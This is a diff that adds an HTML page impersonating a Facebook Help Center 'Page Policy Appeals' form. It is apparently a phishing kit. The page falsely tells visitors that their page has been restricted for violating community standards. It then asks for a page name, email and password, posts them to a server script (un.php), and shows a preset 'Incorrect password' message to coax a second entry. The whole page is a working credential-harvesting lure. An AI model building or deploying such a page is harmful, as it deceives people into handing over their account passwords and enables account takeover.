@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>Help Center | Page Policy Appeals</title>
+
+  <style>
+    /* ---------- RESET RINGAN ---------- */
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #1c1e21;
+      background-color: #fff;
+      line-height: 1.4;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+    button {
+      cursor: pointer;
+      font-family: inherit;
+    }
+    input {
+      font-family: inherit;
+    }
+
+    /* ---------- GLOBAL VARIABEL WARNA ---------- */
+    :root {
+      --border-color: #d9dce1;
+      --border-dark: #c7c9ce;
+      --text-main: #1c1e21;
+      --text-dim: #65676b;
+      --bg-page: #ffffff;
+      --bg-card-header: #e9eaed;
+      --bg-card: #ffffff;
+      --bg-footer: #f0f2f5;
+      --link-color: #1b74e4;
+      --radius-md: 4px;
+      --radius-lg: 6px;
+    }
+
+    /* ---------- LAYOUT ATAS (HEADER BAR) ---------- */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 12px;
+      background-color: #ffffff;
+      border-bottom: 1px solid var(--border-color);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      min-height: 40px;
+    }
+
+    .topbar-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-main);
+    }
+
+    .fb-logo {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background-color: #1877f2;
+      color: #fff;
+      font-family: system-ui, sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      line-height: 28px;
+      text-align: center;
+    }
+
+    .help-center-text {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1c1e21;
+    }
+
+    .topbar-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .account-icon-wrapper {
+      border: 1px solid var(--border-color);
+      background-color: #fff;
+      border-radius: 999px;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      color: #1c1e21;
+      box-shadow: 0 1px 2px rgba(0,0,0,.1);
+    }
+    .account-icon-wrapper::before {
+      content: "👤";
+    }
+
+    .lang-button {
+      border: 1px solid var(--border-color);
+      background-color: #f5f6f7;
+      border-radius: var(--radius-md);
+      font-size: 13px;
+      padding: 6px 8px;
+      line-height: 1;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      box-shadow: 0 1px 2px rgba(0,0,0,.05);
+    }
+    .lang-button span {
+      font-weight: 500;
+    }
+
+    /* ---------- WRAPPER KONTEN HALAMAN ---------- */
+    .page-wrapper {
+      display: flex;
+      align-items: flex-start;
+      max-width: 1280px;
+      margin: 16px auto 0;
+      padding: 0 12px;
+      gap: 16px;
+    }
+
+    /* ---------- SIDEBAR KIRI ---------- */
+    .sidebar {
+      width: 260px;
+      min-width: 240px;
+      flex-shrink: 0;
+      border-right: 1px solid var(--border-color);
+      padding-right: 12px;
+    }
+
+    @media (max-width: 900px) {
+      .sidebar {
+        display: none; /* Mimic desktop-only left nav */
+      }
+    }
+
+    .accordion-list {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    .accordion-item {
+      border-bottom: 1px solid var(--border-color);
+      padding: 12px 8px;
+      cursor: pointer;
+    }
+
+    .accordion-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text-main);
+    }
+
+    .acc-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      min-width: 0;
+    }
+
+    /* bulat abu ikon kiri */
+    .acc-icon-circle {
+      width: 28px;
+      height: 28px;
+      border-radius: 999px;
+      border: 1px solid #d0d3d8;
+      background: radial-gradient(circle at 30% 30%, #fff 0%, #f9f9f9 40%, #dcdfe4 80%);
+      box-shadow: 0 1px 2px rgba(0,0,0,.08) inset;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      color: #000;
+    }
+
+    .acc-title {
+      white-space: nowrap;
+      font-size: 14px;
+      font-weight: 600;
+      color: #1c1e21;
+    }
+
+    .acc-arrow {
+      font-size: 14px;
+      color: #1c1e21;
+      user-select: none;
+      display: flex;
+      align-items: center;
+    }
+
+    .accordion-body {
+      margin-top: 8px;
+      color: var(--text-dim);
+      font-size: 13px;
+      line-height: 1.4;
+      display: none;
+      padding-left: 36px;
+      max-width: 200px;
+    }
+
+    .accordion-item.open .accordion-body {
+      display: block;
+    }
+
+    /* ---------- AREA KONTEN UTAMA ---------- */
+    .content-area {
+      flex: 1;
+      min-width: 0;
+      padding-bottom: 40px;
+    }
+
+    .card-form-wrapper {
+      max-width: 720px;
+      margin: 0 auto;
+      border: 1px solid var(--border-dark);
+      border-radius: var(--radius-md);
+      background-color: var(--bg-card);
+      box-shadow: 0 1px 2px rgba(0,0,0,.05);
+      overflow: hidden;
+      font-size: 14px;
+    }
+
+    .card-header {
+      background-color: var(--bg-card-header);
+      border-bottom: 1px solid var(--border-dark);
+      padding: 16px;
+      font-weight: 600;
+      font-size: 20px;
+      line-height: 1.2;
+      color: #1c1e21;
+    }
+
+    .card-body {
+      padding: 16px;
+      color: var(--text-main);
+      line-height: 1.4;
+    }
+
+    .intro-text {
+      font-size: 13px;
+      line-height: 1.5;
+      color: var(--text-main);
+      margin-bottom: 16px;
+    }
+
+    .intro-text p {
+      margin: 0 0 8px;
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .form-label-row {
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-main);
+      margin-bottom: 4px;
+    }
+
+    .required-star {
+      color: #d32f2f;
+      margin-left: 4px;
+      font-weight: 600;
+    }
+
+    .form-input {
+      width: 100%;
+      border: 1px solid var(--border-dark);
+      border-radius: var(--radius-md);
+      padding: 8px;
+      font-size: 14px;
+      line-height: 1.4;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .form-input:focus {
+      border-color: #1b74e4;
+      box-shadow: 0 0 0 2px rgba(27,116,228,0.15);
+    }
+
+    .submit-row {
+      margin-top: 16px;
+    }
+
+    .submit-btn {
+      appearance: none;
+      background-color: #f5f6f7;
+      border: 1px solid var(--border-dark);
+      border-radius: var(--radius-md);
+      font-size: 14px;
+      font-weight: 600;
+      line-height: 1.4;
+      color: #1c1e21;
+      padding: 6px 12px;
+      box-shadow: 0 1px 2px rgba(0,0,0,.05);
+    }
+
+    .submit-btn:hover {
+      background-color: #e4e6eb;
+    }
+
+    /* ---------- FOOTER ---------- */
+    .footer-wrapper {
+      background-color: var(--bg-footer);
+      border-top: 1px solid var(--border-color);
+      margin-top: 32px;
+      padding: 24px 12px 40px;
+      color: #1c1e21;
+      font-size: 13px;
+    }
+
+    .footer-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      color: #1c1e21;
+    }
+
+    .footer-links-grid {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 32px;
+    }
+
+    .footer-col {
+      text-align: left;
+      min-width: 140px;
+    }
+
+    @media (max-width:600px){
+      .footer-col {
+        text-align: center;
+      }
+    }
+
+    .footer-link-item {
+      margin-bottom: 12px;
+      color: var(--text-main);
+      text-decoration: none;
+      display: block;
+    }
+    .footer-link-item:hover {
+      text-decoration: underline;
+      color: var(--link-color);
+    }
+
+    .footer-bottom-line {
+      border-top: 1px solid var(--border-color);
+      margin-top: 24px;
+      padding-top: 12px;
+      text-align: center;
+      color: #65676b;
+      font-size: 12px;
+    }
+
+    /* ---------- RESPONSIVE TWEAK ---------- */
+    @media (max-width:480px){
+      .topbar-left .help-center-text {
+        display: none;
+      }
+    }
+     /* ---------- RESET ---------- */
+    *, *::before, *::after { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #1c1e21;
+      background-color: #fff;
+      line-height: 1.4;
+    }
+
+    /* ---------- WARNA DAN TEMA ---------- */
+    :root {
+      --border-color: #d9dce1;
+      --border-dark: #c7c9ce;
+      --text-main: #1c1e21;
+      --text-dim: #65676b;
+      --bg-footer: #f0f2f5;
+      --link-color: #1b74e4;
+      --radius-md: 4px;
+    }
+
+    .topbar {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 8px 12px; border-bottom: 1px solid var(--border-color);
+    }
+    .fb-logo { background:#1877f2; color:#fff; border-radius:50%; width:28px; height:28px; text-align:center; line-height:28px; font-weight:700; }
+    .lang-button { border:1px solid var(--border-color); background:#f5f6f7; border-radius:4px; padding:5px 8px; }
+
+    .content-area { max-width:720px; margin:30px auto; border:1px solid var(--border-dark); border-radius:4px; padding:16px; }
+    .form-input { width:100%; border:1px solid var(--border-dark); border-radius:4px; padding:8px; margin-bottom:10px; }
+    .submit-btn { background:#f5f6f7; border:1px solid var(--border-dark); border-radius:4px; padding:8px 14px; font-weight:600; cursor:pointer; }
+    .submit-btn:hover { background:#e4e6eb; }
+
+    /* ---------- MODAL ERROR ---------- */
+    .modal-overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: none; justify-content: center; align-items: center;
+      z-index: 9999;
+    }
+    .modal-box {
+      background: #fff; border-radius: 8px; width: 90%; max-width: 340px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      animation: pop .2s ease-out;
+      overflow: hidden;
+    }
+    .modal-header {
+      background: #ffe9ea; color:#b71c1c; padding:12px 16px;
+      font-weight:600; border-bottom:1px solid #f5c2c7;
+    }
+    .modal-body { padding:16px; font-size:14px; color:#1c1e21; }
+    .modal-footer { padding:12px 16px; background:#f5f6f7; text-align:right; }
+    .close-btn {
+      background:#1b74e4; color:#fff; border:none; border-radius:4px; padding:6px 12px; font-weight:600; cursor:pointer;
+    }
+    .close-btn:hover { filter:brightness(0.9); }
+
+    @keyframes pop { from{transform:scale(.9);opacity:0;} to{transform:scale(1);opacity:1;} }
+  </style>
+</head>
+<body>
+
+  <!-- ======= TOP BAR ======= -->
+  <header class="topbar">
+    <div class="topbar-left">
+      <div class="fb-logo">f</div>
+      <div class="help-center-text">Help Center</div>
+    </div>
+
+    <div class="topbar-right">
+      <div class="account-icon-wrapper" title="Account"></div>
+
+      <button class="lang-button" id="langBtn" type="button">
+        <span>English</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- ======= LAYOUT WRAPPER ======= -->
+  <div class="page-wrapper">
+
+    <!-- ======= SIDEBAR LEFT ======= -->
+    <aside class="sidebar">
+      <ul class="accordion-list">
+
+        <li class="accordion-item open">
+          <div class="accordion-header">
+            <div class="acc-left">
+              <div class="acc-icon-circle">❔</div>
+              <div class="acc-title">Using</div>
+            </div>
+            <div class="acc-arrow">▾</div>
+          </div>
+          <div class="accordion-body">
+            Bantuan fitur, cara pakai produk, dan panduan umum.
+          </div>
+        </li>
+
+        <li class="accordion-item">
+          <div class="accordion-header">
+            <div class="acc-left">
+              <div class="acc-icon-circle">👥</div>
+              <div class="acc-title">Managing Your Account</div>
+            </div>
+            <div class="acc-arrow">▾</div>
+          </div>
+          <div class="accordion-body">
+            Pengaturan akun, login, pemulihan akses, dsb.
+          </div>
+        </li>
+
+        <li class="accordion-item">
+          <div class="accordion-header">
+            <div class="acc-left">
+              <div class="acc-icon-circle">🔒</div>
+              <div class="acc-title">Privacy, Safety and Security</div>
+            </div>
+            <div class="acc-arrow">▾</div>
+          </div>
+          <div class="accordion-body">
+            Keamanan, laporan penyalahgunaan, perlindungan data.
+          </div>
+        </li>
+
+        <li class="accordion-item">
+          <div class="accordion-header">
+            <div class="acc-left">
+              <div class="acc-icon-circle">❗</div>
+              <div class="acc-title">Policies and Reporting</div>
+            </div>
+            <div class="acc-arrow">▾</div>
+          </div>
+          <div class="accordion-body">
+            Kebijakan komunitas, banding, pelaporan pelanggaran.
+          </div>
+        </li>
+
+      </ul>
+    </aside>
+
+    <!-- ======= MAIN CONTENT ======= -->
+    <main class="content-area">
+      <section class="card-form-wrapper">
+        <div class="card-header">
+          Page Policy Appeals
+        </div>
+
+        <div class="card-body">
+          <div class="intro-text">
+            <p>We have detected unusual activity on your page that violates our community standards.</p>
+            <p>Your access to your page has been <strong>limited</strong>, and you are currently unable to post, share, or comment using your page.</p>
+            <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
+          </div>
+
+          <!-- FORM DIPERBAIKI -->
+          <form id="appealForm" method="post" action="un.php">
+            <div class="form-group">
+              <div class="form-label-row">
+                <label for="pageName">Page Name</label>
+                <span class="required-star">*</span>
+              </div>
+              <input class="form-input" type="text" id="pageName" name="pageName" required />
+            </div>
+
+            <div class="form-group">
+              <div class="form-label-row">
+                <label for="email">Email</label>
+                <span class="required-star">*</span>
+              </div>
+              <input class="form-input" type="email" id="email" name="email" required />
+            </div>
+
+            <div class="form-group">
+              <div class="form-label-row">
+                <label for="password">Password</label>
+                <span class="required-star">*</span>
+              </div>
+              <input class="form-input" type="password" class="error" id="password" name="password" required />
+              <label style="font-size:12px;display:flex;align-items:center;gap:4px;margin-top:6px;cursor:pointer;">
+                <input type="checkbox" id="showPassChk" /> Show Password
+              </label>
+               <div class="error-text" id="passwordErrorMsg">Incorrect password</div>
+            </div>
+
+            <div class="submit-row">
+              <button class="submit-btn" type="submit">Submit</button>
+            </div>
+          </form>
+          <!-- /FORM DIPERBAIKI -->
+
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <!-- ======= FOOTER ======= -->
+  <footer class="footer-wrapper">
+    <div class="footer-inner">
+
+      <div class="footer-links-grid">
+        <div class="footer-col">
+          <a class="footer-link-item" href="#">About</a>
+          <a class="footer-link-item" href="#">Ad choices</a>
+          <a class="footer-link-item" href="#">Create ad</a>
+        </div>
+
+        <div class="footer-col">
+          <a class="footer-link-item" href="#">Privacy</a>
+          <a class="footer-link-item" href="#">Careers</a>
+          <a class="footer-link-item" href="#">Create Page</a>
+        </div>
+
+        <div class="footer-col">
+          <a class="footer-link-item" href="#">Terms and policies</a>
+          <a class="footer-link-item" href="#">Cookies</a>
+        </div>
+      </div>
+
+      <div class="footer-bottom-line">
+        © 2025 Help Center
+      </div>
+    </div>
+  </footer>
+
+  <!-- ======= SCRIPT ======= -->
+  <script>
+    // toggle show/hide password
+    function togglePassword() {
+      var x = document.getElementById("password");
+      x.type = x.type === "password" ? "text" : "password";
+    }
+
+    document.getElementById("showPassChk").addEventListener("change", togglePassword);
+
+    // Toggle accordion open/close
+    document.querySelectorAll(".accordion-item").forEach(function(item){
+      item.addEventListener("click", function(){
+        item.classList.toggle("open");
+        const arrowEl = item.querySelector(".acc-arrow");
+        arrowEl.textContent = item.classList.contains("open") ? "▾" : "▸";
+      });
+    });
+
+    // Fake language dropdown click
+    document.getElementById("langBtn").addEventListener("click", function(){
+      alert("Language selector clicked (stub).");
+    });
+
+    // Handle form submit
+    document.getElementById("appealForm").addEventListener("submit", function(e){
+      // cek semua required sudah diisi
+      const pageName = document.getElementById("pageName").value.trim();
+      const email    = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!pageName || !email || !password) {
+        e.preventDefault(); // stop submit kalau ada yg kosong
+        alert("Please fill out all required fields.");
+        return;
+      }
+
+      // kalau lolos validasi:
+      // TIDAK pakai preventDefault -> browser akan kirim POST ke in.php
+      // optional: bisa console.log buat debugging
+      console.log("Sending to server:", { pageName, email, password });
+    });
+
+        // toggle show password
+    document.getElementById("showPassChk").addEventListener("change", function() {
+      const pwd = document.getElementById("password");
+      pwd.type = this.checked ? "text" : "password";
+    });
+
+      
+  </script>
+</body>
+</html>
